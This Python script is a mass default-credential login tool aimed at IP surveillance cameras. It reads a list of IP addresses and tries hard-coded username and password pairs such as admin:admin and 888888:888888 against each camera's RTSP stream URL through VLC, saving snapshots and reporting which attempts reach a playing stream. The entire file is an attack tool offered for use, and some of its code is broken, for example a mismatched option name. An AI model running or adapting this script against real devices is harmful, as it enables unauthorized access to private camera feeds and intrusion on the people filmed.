from base64 import b64encode as encrypt
from base64 import b64encode as decrypt
from time import time as tmp
from time import sleep as wait
import json
import vlc
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-f", "--file", dest="file_list_ip", help="Specify filename with list of IPs")

(options, args) = parser.parse_args()

if (options.input_list_ip == None):
    parser.error("-f IP list file is required")

def attack(ip,user):
    try:
        encrypted=encrypt(bytes(user, encoding="utf-8")).decode("utf-8")
        instance = vlc.Instance("--vout=dummy --network-caching=200 --sout-mux-caching=<>")
        player = instance.media_player_new()
        player.set_mrl("rtsp://"+ip+":554/cam/realmonitor?channel=1&subtype=0&authbasic="+encrypted)
        player.play()

        time = tmp() + 3
        while tmp() < time:
            player.video_take_snapshot(0, 'stream.png', 0, 0)
            state = str(player.get_state())
            if ('Playing' in state):
                print(state, ip, user)
                break
            if ('Ended' in state):
                print(state, ip, user)
                break
            else:
                print(state, ip, user)

    except Exception as e:
        print("Error:",e)

    return

ips = open(options.file_list_ip,'r')
ips = ips.readlines()

for ip in ips:
    ip = ip.split("\n")[0]
        
    attack(ip,"admin:admin")
    wait(1)
    attack(ip,"admin:123456")
    wait(1)
    attack(ip,"666666:666666")
    wait(1)
    attack(ip,"666666:123456")
    wait(1)
    attack(ip,"default:default")
    wait(1)
    attack(ip,"default:123456")
    wait(1)
    attack(ip,"888888:888888")
    wait(1)
    attack(ip,"888888:123456")
    wait(1)
    attack(ip,"user:user")
    wait(1)
    attack(ip,"user:123456")
    wait(1)
    attack(ip,"administrador:123456")
    wait(1)
    attack(ip,"administrador:12345")
    wait(1)
    
ips.close()
